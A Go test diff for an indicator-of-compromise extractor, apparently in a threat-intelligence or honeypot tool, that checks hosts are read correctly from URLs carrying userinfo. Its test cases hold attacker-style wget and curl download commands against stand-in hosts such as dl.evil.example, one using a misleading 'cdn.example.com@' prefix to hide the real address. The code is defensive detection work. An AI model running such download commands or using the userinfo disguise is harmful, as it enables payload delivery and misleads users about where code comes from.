@@ -483,6 +483,31 @@ func iocSet(iocs []*database.IOC) map[string]int {
 	return m
 }
 
+// The host a URL connects to follows the userinfo: for
+// "http://cdn.example.com@203.0.113.9/x.sh" curl and wget fetch from
+// 203.0.113.9. A regex over the authority took the userinfo as the host, so
+// the real address was missed and an arbitrary domain was reported instead
+// (and exported to MISP flagged for IDS).
+func TestExtractURLHostAfterUserinfo(t *testing.T) {
+	e := NewExtractor()
+	cases := []struct{ cmd, want, notWant string }{
+		{"wget http://cdn.example.com@203.0.113.9/x.sh", "ip:203.0.113.9", "domain:cdn.example.com"},
+		{"curl -O http://user:pass@dl.evil.example/bin", "domain:dl.evil.example", "domain:user"},
+		{"wget http://anon[at]files.evil.example/a", "domain:files.evil.example", ""},
+		{"wget http://[2001:db8:1::9]:8080/x", "ip:2001:db8:1::9", ""},
+		{"wget http://evil.example:8080/x", "domain:evil.example", ""},
+	}
+	for _, tc := range cases {
+		got := iocSet(e.Extract(makeIOCEvent("198.51.100.7", "command", tc.cmd, nil)))
+		if got[tc.want] == 0 {
+			t.Errorf("%q: missing %s (got %v)", tc.cmd, tc.want, got)
+		}
+		if tc.notWant != "" && got[tc.notWant] != 0 {
+			t.Errorf("%q: reported %s, which is userinfo, not the host", tc.cmd, tc.notWant)
+		}
+	}
+}
+
 // curl and wget accept a scheme in any case, and refang turned "HXXPS://" into
 // "httPS://"; the case-sensitive URL pattern missed both.
 func TestExtractURLSchemeAnyCase(t *testing.T) {
